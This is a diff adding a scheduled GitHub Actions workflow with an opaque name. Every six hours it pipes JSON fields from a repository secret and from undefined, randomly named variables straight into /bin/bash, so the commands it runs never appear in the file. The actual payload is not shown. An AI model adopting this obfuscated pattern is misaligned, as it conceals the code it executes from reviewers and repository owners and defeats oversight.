@@ -1,0 +1,28 @@
+name: shuangchenyanhou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shuangchenyanhou
+        env:
+          j4: ${{ secrets.j4 }}
+        run: |
+          echo $j4 | jq -r .vnt8 | /bin/bash
+          echo $t5 | jq -r .lf79768 | /bin/bash
+          echo $flmhy037 | jq -r .qu80129 | /bin/bash
+          echo $tirli0935 | jq -r .ltxo306 | /bin/bash
+          echo $krp73 | jq -r .fq13013 | /bin/bash
+          echo $mck26895 | jq -r .s4 | /bin/bash
+          echo $kwes18958 | jq -r .bctx694 | /bin/bash
+          echo $spga60 | jq -r .r2518 | /bin/bash
+          echo $eqj16985 | jq -r .xz0 | /bin/bash
+          echo $gowo0 | jq -r .ayiwr5 | /bin/bash
+          echo $nq9 | jq -r .rfij43 | /bin/bash
+          echo $kwleu728 | jq -r .gd261 | /bin/bash
+
